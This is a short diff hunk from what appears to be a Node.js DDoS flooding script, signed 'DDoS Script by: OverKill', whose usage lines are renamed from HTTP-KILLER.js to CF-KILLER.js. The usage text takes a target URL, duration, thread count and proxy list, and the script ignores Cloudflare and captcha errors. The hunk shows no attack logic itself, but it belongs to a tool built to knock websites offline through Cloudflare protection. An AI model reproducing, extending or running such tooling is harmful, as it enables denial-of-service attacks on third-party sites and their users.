@@ -45,8 +45,8 @@ ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareErr
 ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
 if (process.argv.length < 6) {
     console.log("\x1b[31m ERROR\x1b[37m: Nhập thiếu dữ liệu");
-    console.log("\x1b[36m USAGE\x1b[37m: node HTTP-KILLER.js <target> <time> <thread> <proxies>");
-    console.log("\x1b[32m EXAMPLE\x1b[37m: node HTTP-KILLER.js https://example.com 60 100 proxy.txt");
+    console.log("\x1b[36m USAGE\x1b[37m: node CF-KILLER.js <target> <time> <thread> <proxies>");
+    console.log("\x1b[32m EXAMPLE\x1b[37m: node CF-KILLER.js https://example.com 60 100 proxy.txt");
     console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill ");
   
     process.exit();
